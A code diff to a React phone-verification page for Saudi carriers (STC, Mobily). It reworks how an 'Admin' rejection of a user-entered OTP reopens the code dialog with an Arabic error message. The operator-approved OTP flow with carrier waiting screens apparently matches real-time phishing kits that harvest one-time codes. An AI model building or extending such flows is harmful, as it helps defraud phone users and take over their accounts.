@@ -28,6 +28,7 @@ export default function VerifyPhonePage() {
   const [showMobilyModal, setShowMobilyModal] = useState(false)
   const [showCarrierModal, setShowCarrierModal] = useState(false)
   const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false)
+  const [otpRejectionError, setOtpRejectionError] = useState("")
   const [phoneError, setPhoneError] = useState("")
 
   // Saudi telecom operators
@@ -250,14 +251,19 @@ export default function VerifyPhonePage() {
   }
 
   const handleOtpRejected = () => {
-    // Admin rejected OTP - close dialog and allow re-entry
-    console.log("[step5] Phone OTP rejected")
-    setShowPhoneOtpDialog(false)
+    // Admin rejected OTP - close waiting modals and reopen OTP dialog with error
+    console.log("[step5] Phone OTP rejected, reopening dialog with error")
     
-    toast.error("تم رفض كود التحقق", {
-      description: "يرجى إدخال الكود الصحيح والمحاولة مرة أخرى",
-      duration: 5000
-    })
+    // Close all waiting modals
+    setShowStcModal(false)
+    setShowMobilyModal(false)
+    setShowCarrierModal(false)
+    
+    // Set error message
+    setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
+    
+    // Reopen OTP dialog
+    setShowPhoneOtpDialog(true)
   }
 
   const handleShowWaitingModal = (carrier: string) => {
@@ -426,11 +432,15 @@ export default function VerifyPhonePage() {
       {/* Phone OTP Dialog */}
       <PhoneOtpDialog
         open={showPhoneOtpDialog}
-        onOpenChange={setShowPhoneOtpDialog}
+        onOpenChange={(open) => {
+          setShowPhoneOtpDialog(open)
+          if (!open) setOtpRejectionError("") // Clear error when closing
+        }}
         phoneNumber={phoneNumber}
         phoneCarrier={selectedCarrier}
         onRejected={handleOtpRejected}
         onShowWaitingModal={handleShowWaitingModal}
+        rejectionError={otpRejectionError}
       />
     </>
   )
